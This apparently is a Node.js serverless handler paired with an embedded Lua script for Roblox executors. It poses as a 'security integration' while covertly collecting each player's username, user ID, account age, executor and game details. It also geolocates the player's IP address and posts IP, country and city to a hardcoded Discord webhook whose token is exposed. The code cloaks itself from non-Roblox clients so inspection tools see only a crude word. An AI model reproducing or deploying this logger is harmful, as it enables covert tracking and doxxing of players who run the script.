const https = require('https');

// === CONFIGURATION === \\
const SETTINGS = {
    // Webhook Lu (Aman di server, gaib dari HTTP Spy)
    WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5",
    
    // Respon jika dibuka di browser (Plain Text)
    PLAIN_TEXT_RESP: "kontol"
};

// --- FUNGSI GEOLOCATION (Server-Side) ---
async function getGeo(ip) {
    return new Promise((resolve) => {
        https.get(`https://ipwho.is/${ip}`, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => resolve(JSON.parse(data)));
        }).on('error', () => resolve({}));
    });
}

// === MAIN EXPORT === \\
module.exports = async (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    const agent = req.headers['user-agent'] || "";
    const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
    
    // Ambil data yang dikirim dari Roblox
    const { step, u, uid, exec, pid, pname, jid, pcount, pmax, age } = req.query;

    // Proteksi: Jika bukan Roblox, kasih link plain text
    if (!agent.includes("Roblox")) return res.status(200).send(SETTINGS.PLAIN_TEXT_RESP);

    // --- STEP 0: COLLECTOR (Otomatis ngambil data Roblox) ---
    if (!step) {
        const host = req.headers.host;
        const path = req.url.split('?')[0];
        const collector = `
            local lp = game.Players.LocalPlayer
            local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
            local exec = (identifyexecutor and identifyexecutor()) or "Unknown"
            
            local function getAge()
                local success, res = pcall(function() return game:HttpGet("https://users.roblox.com/v1/users/"..lp.UserId) end)
                if not success then return "-" end
                local data = game:GetService("HttpService"):JSONDecode(res)
                return data.created:sub(1,10)
            end

            local q = string.format("?step=1&u=%s&uid=%d&exec=%s&pid=%d&pname=%s&jid=%s&pcount=%d&pmax=%d&age=%s",
                game.HttpService:UrlEncode(lp.Name), lp.UserId, game.HttpService:UrlEncode(exec),
                game.PlaceId, game.HttpService:UrlEncode(info.Name), game.JobId, #game.Players:GetPlayers(), game.Players.MaxPlayers, getAge())
            
            game:HttpGet("https://${host}${path}" .. q)
            print("Successfully Integrated with Ndraawz Security")
        `.trim();
        return res.status(200).send(collector);
    }

    // --- STEP 1: LOGGING KE DISCORD ---
    try {
        const geo = await getGeo(ip);
        const flag = geo.country_code ? geo.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397)) : "🏴‍☠️";

        const embed = {
            title: "📢 Player Info Logger (GOD MODE)",
            color: 16753920,
            fields: [
                { name: "👤 Username", value: u || "Unknown", inline: true },
                { name: "🆔 User ID", value: uid || "Unknown", inline: true },
                { name: "📅 Account Created", value: age || "-", inline: true },
                { name: "💻 Executor", value: exec || "Unknown", inline: true },
                { name: "🌐 IP Address", value: `||${ip}||`, inline: true },
                { name: "🏳️ Country", value: `${flag} ${geo.country || "Unknown"}`, inline: true },
                { name: "🏙️ City", value: `${geo.city || "Unknown"}`, inline: true },
                { name: "🗺️ Map", value: `[${pname || "Game"}](https://www.roblox.com/games/${pid})`, inline: false },
                { name: "👥 Players", value: `${pcount} / ${pmax}`, inline: true }
            ],
            thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${uid}&width=420&height=420&format=png` },
            footer: { text: "Ndraawz Security | " + new Date().toLocaleString() },
            timestamp: new Date().toISOString()
        };

        const url = new URL(SETTINGS.WEBHOOK);
        const webhookReq = https.request({
            hostname: url.hostname, path: url.pathname, method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        webhookReq.write(JSON.stringify({ embeds: [embed] }));
        webhookReq.end();

        return res.status(200).send("-- Logged --");
    } catch (err) {
        return res.status(500).send("-- Error");
    }
};
